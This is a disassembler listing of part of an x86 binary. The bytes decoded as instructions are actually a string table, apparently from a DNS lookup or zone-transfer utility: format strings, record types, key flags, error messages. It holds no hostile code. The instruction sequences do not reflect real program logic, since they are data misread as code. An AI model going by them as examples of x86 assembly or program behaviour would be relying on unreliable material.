  402cce:	and    BYTE PTR [edx+0x65],dh
  402cd1:	jbe    0x402d38
  402cd3:	jb     0x402d48
  402cd5:	and    BYTE PTR gs:[eax],ch
  402cd8:	outs   dx,BYTE PTR ds:[esi]
  402cd9:	bound  esi,QWORD PTR [ebx+0x74]
  402cdc:	popa   
  402cdd:	je     0x402d08
  402cdf:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  402ce3:	imul   esi,DWORD PTR [ebp+0x70],0xa
  402ce7:	or     DWORD PTR [eax],esp
  402ce9:	and    BYTE PTR [esi+0x6c],ah
  402cec:	popa   
  402ced:	addr16 jae 0x402d10
  402cf0:	cmp    eax,0x786c2520
  402cf5:	and    BYTE PTR [eax],ch
  402cf7:	and    eax,0x73252073
  402cfc:	sub    DWORD PTR [edx],ecx
  402cfe:	or     DWORD PTR [eax],esp
  402d00:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  402d04:	imul   esi,DWORD PTR [ebp+0x70],0x20
  402d08:	je     0x402d73
  402d0a:	ins    DWORD PTR es:[edi],dx
  402d0b:	outs   dx,DWORD PTR gs:[esi]
  402d0d:	jne    0x402d83
  402d0f:	and    BYTE PTR ds:0x756c2520,bh
  402d15:	or     cl,BYTE PTR [ecx]
  402d17:	and    BYTE PTR [eax],ah
  402d19:	arpl   WORD PTR [ecx+0x63],sp
  402d1c:	push   0x54542065
  402d21:	dec    esp
  402d22:	and    BYTE PTR [eax],ah
  402d24:	and    BYTE PTR [eax],ah
  402d26:	and    BYTE PTR [eax],ah
  402d28:	cmp    eax,0x756c2520
  402d2d:	or     cl,BYTE PTR [ecx]
  402d2f:	and    BYTE PTR [eax],ah
  402d31:	jb     0x402d98
  402d33:	jae    0x402daa
  402d35:	ins    BYTE PTR es:[edi],dx
  402d36:	je     0x402d58
  402d38:	outs   dx,DWORD PTR fs:[esi]
  402d3a:	ins    DWORD PTR es:[edi],dx
  402d3b:	popa   
  402d3c:	imul   ebp,DWORD PTR [esi+0x20],0x203d20
  402d43:	add    BYTE PTR [ecx],cl
  402d45:	dec    esi
  402d46:	pop    eax
  402d47:	push   esp
  402d48:	or     cl,BYTE PTR [ecx]
  402d4a:	and    BYTE PTR [eax],ah
  402d4c:	outs   dx,BYTE PTR ds:[esi]
  402d4d:	gs js  0x402dc4
  402d50:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  402d54:	popa   
  402d55:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  402d5c:	and    BYTE PTR ds:0x90a0020,bh
  402d62:	and    BYTE PTR [eax],ah
  402d64:	je     0x402ddf
  402d66:	jo     0x402dcd
  402d68:	and    BYTE PTR [edx+0x69],ah
  402d6b:	je     0x402dda
  402d6d:	popa   
  402d6e:	jo     0x402d90
  402d70:	cmp    eax,0x25000020
  402d75:	xor    BYTE PTR [edx],dh
  402d77:	pop    eax
  402d78:	and    BYTE PTR [eax],al
  402d7a:	add    BYTE PTR [eax],al
  402d7c:	popa   
  402d7d:	jne    0x402df3
  402d7f:	push   0x6e6f632f
  402d84:	data16 and BYTE PTR [eax],al
  402d87:	add    BYTE PTR [ecx+0x75],ah
  402d8a:	je     0x402df4
  402d8c:	sub    eax,0x796c6e6f
  402d91:	and    BYTE PTR [eax],al
  402d93:	add    BYTE PTR [ebx+0x6f],ah
  402d96:	outs   dx,BYTE PTR ds:[esi]
  402d97:	sub    ax,0x6e6f
  402d9b:	ins    BYTE PTR es:[edi],dx
  402d9c:	jns    0x402dbe
  402d9e:	add    BYTE PTR [eax],al
  402da0:	outs   dx,BYTE PTR ds:[esi]
  402da1:	outs   dx,DWORD PTR ds:[esi]
  402da2:	sub    eax,0x2079656b
  402da7:	add    BYTE PTR [esi+0x6c],ah
  402daa:	popa   
  402dab:	addr16 sub eax,0x20747865
  402db1:	add    BYTE PTR [eax],al
  402db3:	add    BYTE PTR [eax+0x6f],ch
  402db6:	jae    0x402e2c
  402db8:	sub    eax,0x2079656b
  402dbd:	add    BYTE PTR [eax],al
  402dbf:	add    BYTE PTR [edx+0x6f],bh
  402dc2:	outs   dx,BYTE PTR ds:[esi]
  402dc3:	gs sub eax,0x2079656b
  402dc9:	add    BYTE PTR [eax],al
  402dcb:	add    BYTE PTR [edi+0x74],ch
  402dce:	push   0x6b2d7265
  402dd3:	gs jns 0x402df6
  402dd6:	add    BYTE PTR [eax],al
  402dd8:	jb     0x402e3f
  402dda:	jae    0x402e41
  402ddc:	jb     0x402e54
  402dde:	gs fs sub eax,0x2079656b
  402de5:	add    BYTE PTR [eax],al
  402de7:	add    BYTE PTR [ecx],cl
  402de9:	and    BYTE PTR [eax],ah
  402deb:	and    BYTE PTR [eax],ah
  402ded:	add    BYTE PTR [eax],al
  402def:	add    BYTE PTR [ecx],cl
  402df1:	dec    ebx
  402df2:	inc    ebp
  402df3:	pop    ecx
  402df4:	or     cl,BYTE PTR [ecx]
  402df6:	and    BYTE PTR [eax],ah
  402df8:	data16 ins BYTE PTR es:[edi],dx
  402dfa:	popa   
  402dfb:	addr16 jae 0x402e1e
  402dfe:	and    BYTE PTR [eax],ah
  402e00:	and    BYTE PTR [eax],ah
  402e02:	and    BYTE PTR ds:0x25783020,bh
  402e08:	xor    BYTE PTR [eax+ebx*2],dh
  402e0b:	and    BYTE PTR ds:0x67697373,ah
  402e11:	outs   dx,BYTE PTR ds:[esi]
  402e12:	popa   
  402e13:	je     0x402e84
  402e15:	jb     0x402e90
  402e17:	cmp    eax,0x90a6425
  402e1c:	and    BYTE PTR [eax],ah
  402e1e:	jo     0x402e92
  402e20:	outs   dx,DWORD PTR ds:[esi]
  402e21:	je     0x402e92
  402e23:	arpl   WORD PTR [edi+0x6c],bp
  402e26:	and    BYTE PTR [eax],ah
  402e28:	and    BYTE PTR ds:0xa732520,bh
  402e2e:	or     DWORD PTR [eax],esp
  402e30:	and    BYTE PTR [ecx+0x6c],ah
  402e33:	outs   dx,DWORD PTR ds:[si]
  402e35:	jb     0x402ea0
  402e37:	je     0x402ea1
  402e39:	ins    DWORD PTR es:[edi],dx
  402e3a:	and    BYTE PTR [eax],ah
  402e3c:	cmp    eax,0xa732520
  402e41:	or     DWORD PTR [eax],esp
  402e43:	and    BYTE PTR [ebx+0x65],ch
  402e46:	jns    0x402e68
  402e48:	ins    BYTE PTR es:[edi],dx
  402e49:	outs   dx,BYTE PTR gs:[esi]
  402e4b:	addr16 je 0x402eb6
  402e4e:	and    BYTE PTR ds:0xa642520,bh
  402e54:	and    eax,0x9000073
  402e59:	push   ebx
  402e5a:	dec    ecx
  402e5b:	inc    edi
  402e5c:	or     cl,BYTE PTR [ecx]
  402e5e:	and    BYTE PTR [eax],ah
  402e60:	je     0x402edb
  402e62:	jo     0x402ec9
  402e64:	and    BYTE PTR [ebx+0x6f],ah
  402e67:	jbe    0x402ece
  402e69:	jb     0x402ed0
  402e6b:	and    BYTE PTR fs:[eax],ah
  402e6e:	and    BYTE PTR [eax],ah
  402e70:	cmp    eax,0xa732520
  402e75:	or     DWORD PTR [eax],esp
  402e77:	and    BYTE PTR [ecx+0x6c],ah
  402e7a:	outs   dx,DWORD PTR ds:[si]
  402e7c:	jb     0x402ee7
  402e7e:	je     0x402ee8
  402e80:	ins    DWORD PTR es:[edi],dx
  402e81:	and    BYTE PTR [eax],ah
  402e83:	and    BYTE PTR [eax],ah
  402e85:	and    BYTE PTR [eax],ah
  402e87:	and    BYTE PTR ds:0xa732520,bh
  402e8d:	or     DWORD PTR [eax],esp
  402e8f:	and    BYTE PTR [ecx+eiz*2+0x62],ch
  402e93:	gs ins BYTE PTR es:[edi],dx
  402e95:	and    BYTE PTR [ebx+0x6f],ah
  402e98:	jne    0x402f08
  402e9a:	je     0x402ebc
  402e9c:	and    BYTE PTR [eax],ah
  402e9e:	and    BYTE PTR [eax],ah
  402ea0:	cmp    eax,0xa752520
  402ea5:	or     DWORD PTR [eax],esp
  402ea7:	and    BYTE PTR [edi+0x72],ch
  402eaa:	imul   esp,DWORD PTR [edi+0x69],0x206c616e
  402eb1:	push   esp
  402eb2:	push   esp
  402eb3:	dec    esp
  402eb4:	and    BYTE PTR [eax],ah
  402eb6:	and    BYTE PTR [eax],ah
  402eb8:	cmp    eax,0xa752520
  402ebd:	or     DWORD PTR [eax],esp
  402ebf:	and    BYTE PTR [ebx+0x69],dh
  402ec2:	and    BYTE PTR [di+0x78],ah
  402ec6:	jo     0x402f31
  402ec8:	jb     0x402f2b
  402eca:	je     0x402f35
  402ecc:	outs   dx,DWORD PTR ds:[esi]
  402ecd:	outs   dx,BYTE PTR ds:[esi]
  402ece:	and    BYTE PTR [eax],ah
  402ed0:	cmp    eax,0x34302520
  402ed5:	fs sub eax,0x64323025
  402edb:	sub    eax,0x64323025
  402ee0:	and    BYTE PTR ds:0x3a643230,ah
  402ee6:	and    eax,0x3a643230
  402eeb:	and    eax,0x20643230
  402ef0:	sub    BYTE PTR ds:0x90a2975,ah
  402ef6:	and    BYTE PTR [eax],ah
  402ef8:	jae    0x402f63
  402efa:	and    BYTE PTR [bx+di+0x6e],ch
  402efe:	arpl   WORD PTR [ebp+0x70],sp
  402f01:	je     0x402f6c
  402f03:	outs   dx,DWORD PTR ds:[esi]
  402f04:	outs   dx,BYTE PTR ds:[esi]
  402f05:	and    BYTE PTR [eax],ah
  402f07:	and    BYTE PTR ds:0x34302520,bh
  402f0d:	fs sub eax,0x64323025
  402f13:	sub    eax,0x64323025
  402f18:	and    BYTE PTR ds:0x3a643230,ah
  402f1e:	and    eax,0x3a643230
  402f23:	and    eax,0x20643230
  402f28:	sub    BYTE PTR ds:0x90a2975,ah
  402f2e:	and    BYTE PTR [eax],ah
  402f30:	imul   esp,DWORD PTR [ebp+0x79],0x20
  402f34:	je     0x402f97
  402f36:	and    BYTE PTR [bx+si],ah
  402f39:	and    BYTE PTR [eax],ah
  402f3b:	and    BYTE PTR [eax],ah
  402f3d:	and    BYTE PTR [eax],ah
  402f3f:	and    BYTE PTR ds:0xa752520,bh
  402f45:	or     DWORD PTR [eax],esp
  402f47:	and    BYTE PTR [ebx+0x69],dh
  402f4a:	outs   dx,BYTE PTR ds:[si]
  402f4c:	gs jb  0x402f76
  402f4f:	jae    0x402f71
  402f51:	outs   dx,BYTE PTR ds:[esi]
  402f52:	popa   
  402f53:	ins    DWORD PTR es:[edi],dx
  402f54:	and    BYTE PTR gs:[eax],ah
  402f57:	and    BYTE PTR ds:0xa000020,bh
  402f5d:	or     DWORD PTR [eax],esp
  402f5f:	and    BYTE PTR [ebx+0x69],dh
  402f62:	and    BYTE PTR [si+0x65],ch
  402f66:	outs   dx,BYTE PTR ds:[esi]
  402f67:	addr16 je 0x402fd2
  402f6a:	and    BYTE PTR [eax],ah
  402f6c:	and    BYTE PTR [eax],ah
  402f6e:	and    BYTE PTR [eax],ah
  402f70:	cmp    eax,0xa642520
  402f75:	and    eax,0x3f090073
  402f7a:	aas    
  402f7b:	aas    
  402f7c:	and    BYTE PTR [ebp+0x6e],dh
  402f7f:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  402f83:	outs   dx,BYTE PTR ds:[esi]
  402f84:	and    BYTE PTR [ecx+edi*2+0x70],dh
  402f88:	and    BYTE PTR gs:0x3f3f2064,ah
  402f8f:	aas    
  402f90:	or     al,BYTE PTR [eax]
  402f92:	add    BYTE PTR [eax],al
  402f94:	or     DWORD PTR [esp+esi*2+0x6c],esi
  402f98:	and    BYTE PTR ds:0x756c2520,bh
  402f9e:	and    BYTE PTR [eax],ch
  402fa0:	and    eax,0xa2973
  402fa5:	add    BYTE PTR [eax],al
  402fa7:	add    BYTE PTR [edx],cl
  402fa9:	sub    ch,BYTE PTR [edx]
  402fab:	sub    ah,BYTE PTR [eax]
  402fad:	inc    ebp
  402fae:	jb     0x403022
  402fb0:	outs   dx,DWORD PTR ds:[esi]
  402fb1:	jb     0x402fed
  402fb3:	and    BYTE PTR [edx+0x65],dh
  402fb6:	arpl   WORD PTR [edi+0x72],bp
  402fb9:	and    BYTE PTR fs:[ebx+0x69],dh
  402fbd:	jp     0x403024
  402fbf:	and    BYTE PTR [ecx+0x6e],ch
  402fc2:	arpl   WORD PTR [edi+0x72],bp
  402fc5:	jb     0x40302c
  402fc7:	arpl   WORD PTR [eax+eiz*1+0x28],si
  402fcb:	and    eax,0x21206449
  402fd0:	cmp    eax,0x29642520
  402fd5:	or     cl,BYTE PTR [edx]
  402fd7:	add    BYTE PTR [ebx+0x25],bl
  402fda:	jae    0x403039
  402fdc:	add    BYTE PTR [eax],al
  402fde:	add    BYTE PTR [eax],al
  402fe0:	and    eax,0x73252e73
  402fe5:	add    BYTE PTR [eax],al
  402fe7:	add    BYTE PTR [eax],ah
  402fe9:	ins    BYTE PTR es:[edi],dx
  402fea:	jae    0x40300c
  402fec:	sub    eax,0x73252074
  402ff1:	and    BYTE PTR ds:0x73,ah
  402ff7:	add    BYTE PTR [ebp+0x6e],dh
  402ffa:	jae    0x403071
  402ffc:	jo     0x40306e
  402ffe:	outs   dx,DWORD PTR ds:[esi]
  402fff:	jb     0x403075
  403001:	gs and BYTE PTR fs:[ecx+0x75],dh
  403006:	gs jb  0x403082
  403009:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40300d:	and    BYTE PTR gs:[esi+0x6f],ah
  403011:	jb     0x403033
  403013:	ins    BYTE PTR es:[edi],dx
  403014:	jae    0x403036
  403016:	arpl   WORD PTR [edi+0x6d],bp
  403019:	ins    DWORD PTR es:[edi],dx
  40301a:	popa   
  40301b:	outs   dx,BYTE PTR ds:[esi]
  40301c:	cmp    ah,BYTE PTR fs:[eax]
  40301f:	and    eax,0xa73
  403024:	and    BYTE PTR [ebx+esi*2+0x20],ch
  403028:	and    eax,0x73252073
  40302d:	add    BYTE PTR [eax],al
  40302f:	add    BYTE PTR ds:0x55000064,ch
  403035:	dec    esi
  403036:	dec    ebx
  403037:	dec    esi
  403038:	dec    edi
  403039:	push   edi
  40303a:	dec    esi
  40303b:	sub    eax,0x56524553
  403040:	inc    ebp
  403041:	push   edx
  403042:	add    BYTE PTR [eax],al
  403044:	ins    BYTE PTR es:[edi],dx
  403045:	jae    0x403081
  403047:	and    BYTE PTR [ebx+0x6f],dh
  40304a:	arpl   WORD PTR [ebx+0x65],bp
  40304d:	je     0x40304f
  40304f:	add    BYTE PTR [ebx+esi*2+0x3a],ch
  403053:	and    BYTE PTR [ebx+0x6f],ah
  403056:	outs   dx,BYTE PTR ds:[esi]
  403057:	outs   dx,BYTE PTR ds:[esi]
  403058:	arpl   WORD PTR gs:[eax+eax*1+0x6c],si
  40305d:	jae    0x403099
  40305f:	and    BYTE PTR [edi+0x72],dh
  403062:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x255b0000
  40306a:	jae    0x4030c9
  40306c:	or     al,BYTE PTR [eax]
  40306e:	add    BYTE PTR [eax],al
  403070:	and    BYTE PTR ds:0xa73,ah
  403077:	add    BYTE PTR [ebx],ah
  403079:	add    BYTE PTR [eax],al
  40307b:	add    BYTE PTR [ebx+0x0],dh
  40307e:	add    BYTE PTR [eax],al
  403080:	and    BYTE PTR [edx],ch
  403082:	sub    ch,BYTE PTR [edx]
  403084:	and    BYTE PTR [ecx+0x6e],ch
  403087:	jbe    0x4030ea
  403089:	ins    BYTE PTR es:[edi],dx
  40308a:	imul   esp,DWORD PTR [eax+eiz*1+0x44],0x7220534e
  403092:	gs jae 0x403104
  403095:	jne    0x403109
  403097:	arpl   WORD PTR [ebp+0x20],sp
  40309a:	jb     0x403101
  40309c:	arpl   WORD PTR [edi+0x72],bp
  40309f:	fs sub al,0x20
  4030a2:	je     0x403109
  4030a4:	jb     0x403113
  4030a6:	imul   ebp,DWORD PTR [esi+0x61],0x676e6974
  4030ad:	and    BYTE PTR [edx+esi*2+0x61],dh
  4030b1:	outs   dx,BYTE PTR ds:[esi]
  4030b2:	jae    0x40311a
  4030b4:	gs jb  0x4030e5
  4030b7:	or     al,BYTE PTR [eax]
  4030b9:	add    BYTE PTR [eax],al
  4030bb:	add    BYTE PTR [edx+0x65],dl
  4030be:	arpl   WORD PTR [ebp+0x69],sp
  4030c1:	jbe    0x403128
  4030c3:	and    BYTE PTR fs:[ecx+0x58],al
  4030c7:	inc    esi
  4030c8:	push   edx
  4030c9:	and    BYTE PTR [ebp+0x65],ch
  4030cc:	jae    0x403141
  4030ce:	popa   
  4030cf:	cmp    ah,BYTE PTR gs:[bx+si]
  4030d3:	and    BYTE PTR [ecx+0x75],dh
  4030d6:	gs jae 0x40314d
  4030d9:	imul   ebp,DWORD PTR [edi+0x6e],0x64253d73
  4030e0:	sub    al,0x20
  4030e2:	popa   
  4030e3:	outs   dx,BYTE PTR ds:[esi]
  4030e4:	jae    0x40315d
  4030e6:	gs jb  0x40315c
  4030e9:	cmp    eax,0xa6425
  4030ee:	add    BYTE PTR [eax],al
  4030f0:	and    BYTE PTR [edx],ch
  4030f2:	sub    ch,BYTE PTR [edx]
  4030f4:	and    BYTE PTR [ecx+0x6e],ch
  4030f7:	jbe    0x40315a
  4030f9:	ins    BYTE PTR es:[edi],dx
  4030fa:	imul   esp,DWORD PTR [eax+eiz*1+0x6e],0x2c656d61
  403102:	and    BYTE PTR [ebp+eiz*2+0x72],dh
  403106:	ins    DWORD PTR es:[edi],dx
  403107:	imul   ebp,DWORD PTR [esi+0x61],0x676e6974
  40310e:	and    BYTE PTR [edx+esi*2+0x61],dh
  403112:	outs   dx,BYTE PTR ds:[esi]
  403113:	jae    0x40317b
  403115:	gs jb  0x403146
  403118:	or     al,BYTE PTR [eax]
  40311a:	add    BYTE PTR [eax],al
  40311c:	add    BYTE PTR cs:[eax],al
  40311f:	add    BYTE PTR [eax],ah
  403121:	and    eax,0x7330332d
  403126:	add    BYTE PTR [eax],al
  403128:	or     DWORD PTR ds:0x2520756c,esp
  40312e:	sub    eax,0x7335
  403133:	add    BYTE PTR [eax],ah
  403135:	and    eax,0x73362d
  40313a:	add    BYTE PTR [eax],al
  40313c:	and    BYTE PTR ds:0x28200073,ah
  403142:	and    eax,0x25202c64
  403147:	sub    DWORD PTR fs:[eax],eax
  40314a:	add    BYTE PTR [eax],al
  40314c:	and    BYTE PTR [eax],ch
  40314e:	fs ins BYTE PTR es:[edi],dx
  403150:	outs   dx,BYTE PTR gs:[esi]
  403152:	and    BYTE PTR ds:0x3f642520,bh
  403158:	sub    DWORD PTR [eax],eax
  40315a:	add    BYTE PTR [eax],al
  40315c:	and    BYTE PTR [edx],ch
  40315e:	sub    ch,BYTE PTR [edx]
  403160:	or     al,BYTE PTR [eax]
  403162:	add    BYTE PTR [eax],al
  403164:	push   0x74736f
  403169:	add    BYTE PTR [eax],al
  40316b:	add    BYTE PTR [ebx+0x65],dh
  40316e:	jb     0x4031e6
  403170:	gs jb  0x403173
  403173:	add    BYTE PTR ds:0x203d2073,ah
  403179:	add    BYTE PTR [eax],al
  40317b:	add    BYTE PTR ds:0x732a2e,ah
  403181:	add    BYTE PTR [eax],al
  403183:	add    BYTE PTR [eax],ah
  403185:	and    eax,0x7330312d
  40318a:	add    BYTE PTR [eax],al
  40318c:	and    BYTE PTR [eax],al
  40318e:	add    BYTE PTR [eax],al
  403190:	and    BYTE PTR [eax],ah
  403192:	and    eax,0x732a2e
  403197:	add    BYTE PTR [eax],ah
  403199:	and    eax,0x28202e73
  40319e:	add    BYTE PTR [eax],al
  4031a0:	and    eax,0x756c2573
  4031a5:	add    BYTE PTR [eax],al
  4031a7:	add    BYTE PTR [ecx],ch
  4031a9:	add    BYTE PTR [eax],al
  4031ab:	add    BYTE PTR [eax],ah
  4031ad:	and    eax,0x2064332d
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	and    BYTE PTR [ecx+0x6e],ch
  4031b7:	jbe    0x40321a
  4031b9:	ins    BYTE PTR es:[edi],dx
  4031ba:	imul   esp,DWORD PTR [eax+eiz*1+0x4d],0x616e2058
  4031c2:	ins    DWORD PTR es:[edi],dx
  4031c3:	or     al,BYTE PTR gs:[eax]
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	or     DWORD PTR [ecx],ecx
  4031ca:	and    ah,BYTE PTR ds:0x22732a2e
  4031d0:	or     al,BYTE PTR [eax]
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	and    BYTE PTR [eax],ah
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	and    BYTE PTR ds:0x756c,ah
  4031de:	add    BYTE PTR [eax],al
  4031e0:	and    BYTE PTR ds:0x2073332d,ah
  4031e6:	add    BYTE PTR [eax],al
  4031e8:	and    BYTE PTR ds:0x69200075,ah
  4031ee:	outs   dx,BYTE PTR ds:[esi]
  4031ef:	jbe    0x403252
  4031f1:	ins    BYTE PTR es:[edi],dx
  4031f2:	imul   esp,DWORD PTR [eax+eiz*1+0x41],0x20414141
  4031fa:	popa   
  4031fb:	fs fs jb 0x403264
  4031ff:	jae    0x403274
  403201:	and    BYTE PTR [ebp+eiz*2+0x6e],ch
  403205:	addr16 je 0x403270
  403208:	add    BYTE PTR [eax],al
  40320a:	add    BYTE PTR [eax],al
  40320c:	and    BYTE PTR [eax+0x72],dh
  40320f:	imul   ebp,DWORD PTR [edi+0x72],0x3d797469
  403216:	and    eax,0x77202c64
  40321b:	imul   esp,DWORD PTR gs:[edi+0x68],0x64253d74
  403223:	sub    al,0x20
  403225:	jo     0x403296
  403227:	jb     0x40329d
  403229:	cmp    eax,0x202c6425
  40322e:	add    BYTE PTR [eax],al
  403230:	or     cl,BYTE PTR [ecx]
  403232:	push   edi
  403233:	dec    ecx
  403234:	dec    esi
  403235:	push   ebx
  403236:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  40323a:	imul   esi,DWORD PTR [ebp+0x70],0x20
  40323e:	imul   ebp,DWORD PTR [esi+0x66],0x20090a6f
  403245:	and    BYTE PTR [esi+0x6c],ah
  403248:	popa   
  403249:	addr16 jae 0x40326c
  40324c:	cmp    eax,0x786c2520
  403251:	and    BYTE PTR [eax],ch
  403253:	and    eax,0x73252073
  403258:	sub    DWORD PTR [edx],ecx
  40325a:	or     DWORD PTR [eax],esp
  40325c:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  403260:	imul   esi,DWORD PTR [ebp+0x70],0x20
  403264:	je     0x4032cf
  403266:	ins    DWORD PTR es:[edi],dx
  403267:	outs   dx,DWORD PTR gs:[esi]
  403269:	jne    0x4032df
  40326b:	and    BYTE PTR ds:0x756c2520,bh
  403271:	or     cl,BYTE PTR [ecx]
  403273:	and    BYTE PTR [eax],ah
  403275:	arpl   WORD PTR [ecx+0x63],sp
  403278:	push   0x54542065
  40327d:	dec    esp
  40327e:	and    BYTE PTR [eax],ah
  403280:	and    BYTE PTR [eax],ah
  403282:	and    BYTE PTR [eax],ah
  403284:	cmp    eax,0x756c2520
  403289:	or     cl,BYTE PTR [ecx]
  40328b:	and    BYTE PTR [eax],ah
  40328d:	jae    0x4032f4
  40328f:	jb     0x403307
  403291:	gs jb  0x4032b4
  403294:	arpl   WORD PTR [edi+0x75],bp
  403297:	outs   dx,BYTE PTR ds:[esi]
  403298:	je     0x4032ba
  40329a:	and    BYTE PTR [eax],ah
  40329c:	cmp    eax,0x756c2520
  4032a1:	add    BYTE PTR [eax],al
  4032a3:	add    BYTE PTR [edx],cl
  4032a5:	or     DWORD PTR [eax],esp
  4032a7:	and    BYTE PTR [edi+0x49],dl
  4032aa:	dec    esi
  4032ab:	push   ebx
  4032ac:	and    BYTE PTR [ebx+0x65],dh
  4032af:	jb     0x403327
  4032b1:	gs jb  0x4032d4
  4032b4:	cmp    eax,0x73252820
  4032b9:	sub    DWORD PTR [eax],eax
  4032bb:	add    BYTE PTR [eax],ah
  4032bd:	jbe    0x403328
  4032bf:	gs ja  0x4032e2
  4032c2:	and    eax,0x73
  4032c7:	add    BYTE PTR [ebx+0x6f],dh
  4032ca:	jb     0x403340
  4032cc:	and    BYTE PTR [eax+eiz*1],bh
  4032cf:	and    eax,0x207c2073
  4032d4:	ins    DWORD PTR es:[edi],dx
  4032d5:	outs   dx,DWORD PTR ds:[esi]
  4032d6:	jb     0x40333d
  4032d8:	add    BYTE PTR [eax],al
  4032da:	add    BYTE PTR [eax],al
  4032dc:	das    
  4032dd:	aas    
  4032de:	add    BYTE PTR [eax],al
  4032e0:	sub    eax,0x2f00003f
  4032e5:	push   0x706c65
  4032ea:	add    BYTE PTR [eax],al
  4032ec:	push   ebp
  4032ed:	outs   dx,BYTE PTR ds:[esi]
  4032ee:	dec    ebx
  4032ef:	outs   dx,BYTE PTR ds:[esi]
  4032f0:	outs   dx,DWORD PTR ds:[esi]
  4032f1:	ja     0x403361
  4032f3:	add    BYTE PTR [esi],bh
  4032f5:	and    BYTE PTR [eax],al
  4032f7:	add    BYTE PTR [eax],ah
  4032f9:	ins    BYTE PTR es:[edi],dx
  4032fa:	jae    0x403361
  4032fc:	jb     0x403374
  4032fe:	gs jb  0x403321
  403301:	and    eax,0x73200073
  403306:	gs jb  0x40337f
  403309:	gs jb  0x40332c
  40330c:	and    eax,0x20000073
  403311:	and    eax,0x73252073
  403316:	add    BYTE PTR [eax],al
  403318:	jae    0x40337f
  40331a:	je     0x40333c
  40331c:	add    BYTE PTR [eax],al
  40331e:	add    BYTE PTR [eax],al
  403320:	popa   
  403321:	ins    BYTE PTR es:[edi],dx
  403322:	ins    BYTE PTR es:[edi],dx
  403323:	add    BYTE PTR [ecx+0x4c],al
  403326:	dec    esp
  403327:	add    BYTE PTR [edx+esi*1+0x0],ah
  40332b:	add    BYTE PTR [esi+0x6f],ch
  40332e:	xor    al,BYTE PTR fs:[eax]
  403331:	add    BYTE PTR [eax],al
  403333:	add    BYTE PTR [edx+esi*1+0x20],ah
  403337:	ins    DWORD PTR es:[edi],dx
  403338:	outs   dx,DWORD PTR ds:[esi]
  403339:	fs and BYTE PTR gs:[ecx+ebp*2+0x73],ah
  40333f:	popa   
  403340:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  403344:	cmp    esp,DWORD PTR [eax]
  403346:	jae    0x4033bc
  403348:	imul   ebp,DWORD PTR [esp+ebp*2+0x20],0x64206e69
  403350:	bound  esi,QWORD PTR gs:[ebp+0x67]
  403354:	and    BYTE PTR [ebp+0x6f],ch
  403357:	fs or  al,BYTE PTR gs:[eax]
  40335b:	add    BYTE PTR [ebp+eiz*2+0x66],ah
  40335f:	add    BYTE PTR [esi+0x6f],ch
  403362:	fs data16 add BYTE PTR gs:[eax],al
  403367:	add    BYTE PTR [edi+ebp*2+0x0],ah
  40336b:	add    BYTE PTR ds:0x64000073,ah
  403371:	bound  eax,QWORD PTR gs:[eax]
  403374:	outs   dx,BYTE PTR ds:[esi]
  403375:	outs   dx,DWORD PTR ds:[esi]
  403376:	fs bound eax,QWORD PTR gs:[eax]
  40337a:	add    BYTE PTR [eax],al
  40337c:	imul   esp,DWORD PTR [edi+0x0],0x696f6e00
  403383:	add    BYTE PTR [bx+si],al
  403386:	add    BYTE PTR [eax],al
  403388:	jo     0x4033f9
  40338a:	add    BYTE PTR [eax],al
  40338c:	and    eax,0x71007568
  403391:	add    BYTE PTR [eax],al
  403393:	add    BYTE PTR [ecx+edi*2+0x0],dh
  403397:	add    BYTE PTR [ebx+0x6c],ah
  40339a:	add    BYTE PTR [eax],al
  40339c:	jb     0x403403
  40339e:	arpl   WORD PTR [eax],ax
  4033a0:	outs   dx,BYTE PTR ds:[esi]
  4033a1:	outs   dx,DWORD PTR ds:[esi]
  4033a2:	jb     0x403409
  4033a4:	arpl   WORD PTR [eax],ax
  4033a6:	add    BYTE PTR [eax],al
  4033a8:	jb     0x40340f
  4033aa:	je     0x4033ac
  4033ac:	and    eax,0x72000064
  4033b1:	outs   dx,DWORD PTR ds:[esi]
  4033b2:	add    BYTE PTR [eax],al
  4033b4:	jae    0x40341b
  4033b6:	popa   
  4033b7:	add    BYTE PTR [esi+0x6f],ch
  4033ba:	jae    0x403421
  4033bc:	popa   
  4033bd:	add    BYTE PTR [eax],al
  4033bf:	add    BYTE PTR [ebx+0x72],dh
  4033c2:	arpl   WORD PTR [eax+0x6c],bp
  4033c5:	add    BYTE PTR [eax],al
  4033c7:	add    BYTE PTR [ecx+ebp*2+0x0],dh
  4033cb:	add    BYTE PTR [esi+0x0],dh
  4033ce:	add    BYTE PTR [eax],al
  4033d0:	outs   dx,BYTE PTR ds:[esi]
  4033d1:	outs   dx,DWORD PTR ds:[esi]
  4033d2:	jbe    0x4033d4
  4033d4:	ins    DWORD PTR es:[edi],dx
  4033d5:	jae    0x40344f
  4033d7:	data16 jb 0x4033da
  4033da:	add    BYTE PTR [eax],al
  4033dc:	outs   dx,BYTE PTR ds:[esi]
  4033dd:	outs   dx,DWORD PTR ds:[esi]
  4033de:	ins    DWORD PTR es:[edi],dx
  4033df:	jae    0x4033e1
  4033e1:	add    BYTE PTR [eax],al
  4033e3:	add    BYTE PTR [ecx+0x78],ch
  4033e6:	data16 jb 0x4033e9
  4033e9:	add    BYTE PTR [eax],al
  4033eb:	add    BYTE PTR [edx+0x61],ah
  4033ee:	jae    0x403455
  4033f0:	ss xor al,0x0
  4033f3:	add    BYTE PTR [esi+0x6f],ch
  4033f6:	bound  esp,QWORD PTR [ecx+0x73]
  4033f9:	gs ss xor al,0x0
  4033fd:	add    BYTE PTR [eax],al
  4033ff:	add    BYTE PTR [esi+0x6f],ch
  403402:	add    BYTE PTR [eax],al
  403404:	and    BYTE PTR [eax],ah
  403406:	jae    0x40347a
  403408:	arpl   WORD PTR [eax+0x6c],bp
  40340b:	imul   esi,DWORD PTR [ebx+0x74],0x73253d
  403412:	add    BYTE PTR [eax],al
  403414:	and    eax,0x732563
  403419:	add    BYTE PTR [eax],al
  40341b:	add    BYTE PTR [eax+0x4f],cl
